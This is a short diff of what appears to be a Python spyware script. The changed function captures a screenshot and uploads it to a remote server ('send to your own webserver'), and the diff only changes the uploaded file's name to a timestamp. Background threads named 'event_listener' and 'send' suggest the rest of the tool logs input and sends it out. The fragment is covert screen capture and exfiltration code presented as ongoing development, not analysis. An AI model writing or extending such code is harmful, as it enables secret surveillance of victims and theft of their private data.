@@ -70,7 +70,7 @@ def screenshot():
     ss.save(buffer, format="PNG")
     buffer.seek(0)
     # send to your own webserver
-    requests.post( url3, files={"file": ("screenshot.png", buffer)})
+    requests.post(url3, files={"file": (f"{int(time.time())}.png", buffer)})
 #________________________________________________________
 thread1 = threading.Thread(target=event_listener, daemon=True)
 thread2 = threading.Thread(target=send, daemon=True)
